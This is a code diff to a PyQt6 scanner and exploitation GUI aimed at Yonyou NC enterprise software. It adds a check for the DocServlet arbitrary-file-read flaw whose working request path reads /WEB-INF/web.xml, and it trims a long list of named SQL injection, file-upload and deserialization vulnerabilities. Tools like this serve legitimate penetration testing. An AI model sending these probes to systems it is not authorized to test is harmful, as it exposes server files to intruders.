@@ -8,7 +8,7 @@ from PyQt6.QtWidgets import (
     QGroupBox, QGridLayout, QSplitter
 )
 from PyQt6.QtCore import Qt, QThread, pyqtSignal, QDateTime
-from PyQt6.QtGui import QFont, QTextCursor, QIcon
+from PyQt6.QtGui import QFont, QTextCursor, QIcon, QTextCharFormat, QColor
 
 
 class LogThread(QThread):
@@ -344,6 +344,58 @@ class ScanThread(QThread):
             self.log_signal.emit(error_msg)
             return f'漏洞检测结果: {vuln_name}检测失败 - {error_msg}'
     
+    def _check_DocServlet(self):
+        """检测用友NC DocServlet 任意文件读取漏洞"""
+        try:
+            # 从目标URL中提取域名或IP加上端口
+            import re
+            target_url = self.target.rstrip('/')
+            # 提取域名/IP和端口
+            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
+            if not match:
+                raise ValueError('无效的目标URL')
+            
+            scheme = match.group(1) or 'http://'
+            host = match.group(2)
+            port = match.group(4) or ('443' if scheme == 'https://' else '80')
+            
+            # 构建请求URL
+            base_url = f"{scheme}{host}:{port}"
+            exploit_url = f"{base_url}/servlet/~webrt/nc.uap.lfw.file.action.DocServlet?disp=/WEB-INF/web.xml"
+            
+            self.log_signal.emit(f'正在检测 DocServlet 任意文件读取漏洞...')
+            
+            # 构建请求头
+            headers = {
+                'Host': f'{host}:{port}',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
+                'Accept-Encoding': 'gzip, deflate',
+                'Accept': '*/*',
+                'Connection': 'close',
+                'Content-Length': '0'
+            }
+            
+            # 发送请求
+            response = requests.get(exploit_url, headers=headers, proxies=self.proxy, timeout=10, verify=False)
+            
+            # 检查响应
+            # 基于nuclei POC的matchers规则：检查响应体中是否包含特定字符串，状态码为200，响应头包含application/xml
+            if (response.status_code == 200 and 
+                'application/xml' in response.headers.get('Content-Type', '') and
+                'nc.bs.framework.server.WebApplicationStartupHook' in response.text and
+                'nc.bs.framework.server.LoggerServletFilte' in response.text):
+                result = f'漏洞检测结果: {target_url} 存在 DocServlet 任意文件读取漏洞！'
+                self.log_signal.emit('漏洞检测发现: 目标存在DocServlet任意文件读取漏洞')
+            else:
+                result = f'漏洞检测结果: {target_url} 未检测到 DocServlet 任意文件读取漏洞'
+                self.log_signal.emit('漏洞检测结果: 未发现DocServlet任意文件读取漏洞')
+            
+            return result
+        except Exception as e:
+            error_msg = f'DocServlet漏洞检测错误: {str(e)}'
+            self.log_signal.emit(error_msg)
+            return f'漏洞检测结果: DocServlet任意文件读取漏洞检测失败 - {error_msg}'
+    
     def _run_detection(self):
         """运行漏洞检测"""
         self.log_signal.emit(f'开始漏洞检测: {self.target}')
@@ -361,7 +413,8 @@ class ScanThread(QThread):
             implemented_vulns = {
                 'BshServlet命令执行': self._check_bsh_servlet,
                 'grouptemplet 文件上传': self._check_grouptemplet_upload,
-                'uapjs 命令执行': self._check_uapjs_command_execution
+                'uapjs 命令执行': self._check_uapjs_command_execution,
+                'DocServlet 任意文件读取': self._check_DocServlet
             }
             
             # 根据选择的漏洞类型执行检测
@@ -370,22 +423,6 @@ class ScanThread(QThread):
                 for vuln_name, check_func in implemented_vulns.items():
                     result = check_func()
                     results.append(result)
-                
-                # 对于下拉框中除了已实现和'全部'之外的所有漏洞，尝试使用POC文件进行检测
-                if main_window and hasattr(main_window, 'vuln_type'):
-                    for i in range(main_window.vuln_type.count()):
-                        current_vuln = main_window.vuln_type.itemText(i)
-                        if current_vuln not in implemented_vulns and current_vuln != '全部':
-                            # 构建POC文件路径
-                            poc_file = os.path.join('POCs', f'{current_vuln}.md')
-                            if os.path.exists(poc_file):
-                                try:
-                                    with open(poc_file, 'r', encoding='utf-8') as f:
-                                        poc_content = f.read()
-                                    poc_result = self._check_poc(current_vuln, poc_content)
-                                    results.append(poc_result)
-                                except Exception as e:
-                                    results.append(f'漏洞检测结果: 读取{current_vuln}的POC文件失败 - {str(e)}')
             else:
                 # 执行单个漏洞检测
                 if vuln_type in implemented_vulns:
@@ -393,18 +430,7 @@ class ScanThread(QThread):
                     result = implemented_vulns[vuln_type]()
                     results.append(result)
                 else:
-                    # 尝试使用POC文件进行检测
-                    poc_file = os.path.join('POCs', f'{vuln_type}.md')
-                    if os.path.exists(poc_file):
-                        try:
-                            with open(poc_file, 'r', encoding='utf-8') as f:
-                                poc_content = f.read()
-                            poc_result = self._check_poc(vuln_type, poc_content)
-                            results.append(poc_result)
-                        except Exception as e:
-                            results.append(f'漏洞检测结果: 读取{vuln_type}的POC文件失败 - {str(e)}')
-                    else:
-                        results.append(f'漏洞检测结果: {vuln_type} 的POC文件不存在')
+                    results.append(f'漏洞检测结果: {vuln_type} 不是已实现的漏洞检测类型')
             
             # 将所有结果合并并发送
             final_result = '\n\n'.join(results)
@@ -650,53 +676,7 @@ class MainWindow(QMainWindow):
             'BshServlet命令执行', 
             'grouptemplet 文件上传', 
             'uapjs 命令执行',
-            '用友NC word.docx任意文件读取漏洞',
-            '用友NC-ActionServlet存在SQL注入漏洞',
-            '用友NC-Cloud uploadChunk 任意文件上传漏洞',
-            '用友NC-Cloud_importhttpscer接口存在任意文件上传漏洞',
-            '用友NC-Cloud接口blobRefClassSearch存在反序列化漏洞',
-            '用友NC-Cloud文件服务器用户登陆绕过漏洞',
-            '用友NC-Cloud系统queryPsnInfo存在SQL注入漏洞',
-            '用友NC-Cloud系统queryStaffByName存在SQL注入漏洞',
-            '用友NC-Cloud系统show_download_content接口存在SQL注入漏洞',
-            '用友NC-Cloud系统接口getStaffInfo存在SQL注入漏洞',
-            '用友NC-avatar接口存在文件上传漏洞',
-            '用友NC-bill存在SQL注入漏洞',
-            '用友NC-cartabletimeline存在SQL注入漏洞',
-            '用友NC-complainbilldetail存在SQL注入漏洞',
-            '用友NC-downCourseWare任意文件读取',
-            '用友NC-downTax存在SQL注入漏洞',
-            '用友NC-oacoSchedulerEvents接口存在sql注入漏洞',
-            '用友NC-pagesServlet存在SQL注入',
-            '用友NC-process存在SQL注入漏洞',
-            '用友NC-runStateServlet接口存在SQL注入漏洞',
-            '用友NC-saveDoc.ajax存在任意文件上传漏洞',
-            '用友NC-showcontent接口存在sql注入漏洞',
-            '用友NC-uploadControl接口存在文件上传漏洞',
-            '用友NC-warningDetailInfo接口存在SQL注入漏洞',
-            '用友NC-workflowImageServlet接口存在sql注入漏洞',
-            '用友NCCloud系统runScript存在SQL注入漏洞',
-            '用友NC_CLOUD_smartweb2.RPC.d_XML外部实体注入',
-            '用友NC_Cloud_soapFormat.ajax接口存在XXE',
-            '用友NC_saveImageServlet接口存在文件上传漏洞',
-            '用友NC及U8cloud系统接口LoggingConfigServlet存在反序列化漏洞(XVE-2024-18151)',
-            '用友NC接口ConfigResourceServlet存在反序列漏洞',
-            '用友NC接口PaWfm存在sql注入漏洞',
-            '用友NC接口download存在SQL注入漏洞',
-            '用友NC接口saveXmlToFIleServlet存在文件上传',
-            '用友NC的download文件存在任意文件读取漏洞',
-            '用友NC系统FileManager接口存在任意文件上传漏洞',
-            '用友NC系统complainjudge接口SQL注入漏洞(XVE-2024-19043)',
-            '用友NC系统linkVoucher存在sql注入漏洞',
-            '用友NC系统printBill接口存在任意文件读取漏洞',
-            '用友NC系统querygoodsgridbycode接口code参数存在SQL注入漏洞',
-            '用友NC系统registerServlet接口存在JNDI注入漏洞',
-            '用友NC系统word.docx存在信息泄露漏洞',
-            '用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)',
-            '用友NC系统接口link存在SQL注入漏洞',
-            '用友NC系统接口yerfile_down存在SQL注入漏洞',
-            '用友nc-cloud RCE',
-            '用友nc电子采购信息系统securitycheck存在sql注入'
+            'DocServlet 任意文件读取'
         ])
         vuln_layout.addWidget(self.vuln_type)
         layout.addLayout(vuln_layout)
@@ -726,54 +706,7 @@ class MainWindow(QMainWindow):
             '请选择漏洞',
             'BshServlet命令执行', 
             'grouptemplet 文件上传', 
-            'uapjs 命令执行',
-            '用友NC word.docx任意文件读取漏洞',
-            '用友NC-ActionServlet存在SQL注入漏洞',
-            '用友NC-Cloud uploadChunk 任意文件上传漏洞',
-            '用友NC-Cloud_importhttpscer接口存在任意文件上传漏洞',
-            '用友NC-Cloud接口blobRefClassSearch存在反序列化漏洞',
-            '用友NC-Cloud文件服务器用户登陆绕过漏洞',
-            '用友NC-Cloud系统queryPsnInfo存在SQL注入漏洞',
-            '用友NC-Cloud系统queryStaffByName存在SQL注入漏洞',
-            '用友NC-Cloud系统show_download_content接口存在SQL注入漏洞',
-            '用友NC-Cloud系统接口getStaffInfo存在SQL注入漏洞',
-            '用友NC-avatar接口存在文件上传漏洞',
-            '用友NC-bill存在SQL注入漏洞',
-            '用友NC-cartabletimeline存在SQL注入漏洞',
-            '用友NC-complainbilldetail存在SQL注入漏洞',
-            '用友NC-downCourseWare任意文件读取',
-            '用友NC-downTax存在SQL注入漏洞',
-            '用友NC-oacoSchedulerEvents接口存在sql注入漏洞',
-            '用友NC-pagesServlet存在SQL注入',
-            '用友NC-process存在SQL注入漏洞',
-            '用友NC-runStateServlet接口存在SQL注入漏洞',
-            '用友NC-saveDoc.ajax存在任意文件上传漏洞',
-            '用友NC-showcontent接口存在sql注入漏洞',
-            '用友NC-uploadControl接口存在文件上传漏洞',
-            '用友NC-warningDetailInfo接口存在SQL注入漏洞',
-            '用友NC-workflowImageServlet接口存在sql注入漏洞',
-            '用友NCCloud系统runScript存在SQL注入漏洞',
-            '用友NC_CLOUD_smartweb2.RPC.d_XML外部实体注入',
-            '用友NC_Cloud_soapFormat.ajax接口存在XXE',
-            '用友NC_saveImageServlet接口存在文件上传漏洞',
-            '用友NC及U8cloud系统接口LoggingConfigServlet存在反序列化漏洞(XVE-2024-18151)',
-            '用友NC接口ConfigResourceServlet存在反序列漏洞',
-            '用友NC接口PaWfm存在sql注入漏洞',
-            '用友NC接口download存在SQL注入漏洞',
-            '用友NC接口saveXmlToFIleServlet存在文件上传',
-            '用友NC的download文件存在任意文件读取漏洞',
-            '用友NC系统FileManager接口存在任意文件上传漏洞',
-            '用友NC系统complainjudge接口SQL注入漏洞(XVE-2024-19043)',
-            '用友NC系统linkVoucher存在sql注入漏洞',
-            '用友NC系统printBill接口存在任意文件读取漏洞',
-            '用友NC系统querygoodsgridbycode接口code参数存在SQL注入漏洞',
-            '用友NC系统registerServlet接口存在JNDI注入漏洞',
-            '用友NC系统word.docx存在信息泄露漏洞',
-            '用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)',
-            '用友NC系统接口link存在SQL注入漏洞',
-            '用友NC系统接口yerfile_down存在SQL注入漏洞',
-            '用友nc-cloud RCE',
-            '用友nc电子采购信息系统securitycheck存在sql注入'
+            'uapjs 命令执行'
         ])
         vuln_layout.addWidget(self.exploit_vuln)
         layout.addLayout(vuln_layout)
@@ -847,8 +780,33 @@ class MainWindow(QMainWindow):
 
 
     def on_detection_result(self, result):
-        """处理漏洞检测结果"""
-        self.detect_result.append(result)
+        """处理漏洞检测结果，添加视觉提示"""
+        # 保存当前光标位置
+        cursor = self.detect_result.textCursor()
+        
+        # 判断漏洞状态并添加相应的视觉提示
+        if '存在' in result and ('漏洞' in result or '可能存在' in result):
+            # 存在漏洞 - 添加绿色对号
+            format_green = QTextCharFormat()
+            format_green.setForeground(QColor('green'))
+            format_green.setFontWeight(QFont.Weight.Bold)
+            cursor.insertText('✅ ', format_green)
+        else:
+            # 不存在漏洞 - 添加红色x号
+            format_red = QTextCharFormat()
+            format_red.setForeground(QColor('red'))
+            format_red.setFontWeight(QFont.Weight.Bold)
+            cursor.insertText('❌ ', format_red)
+        
+        # 创建默认格式（重置所有格式设置）
+        default_format = QTextCharFormat()
+        cursor.setCharFormat(default_format)
+        
+        # 使用默认格式插入结果文本
+        cursor.insertText(result + '\n')
+        
+        # 滚动到底部
+        self.detect_result.moveCursor(QTextCursor.MoveOperation.End)
 
     def start_exploitation(self):
         """开始漏洞利用"""
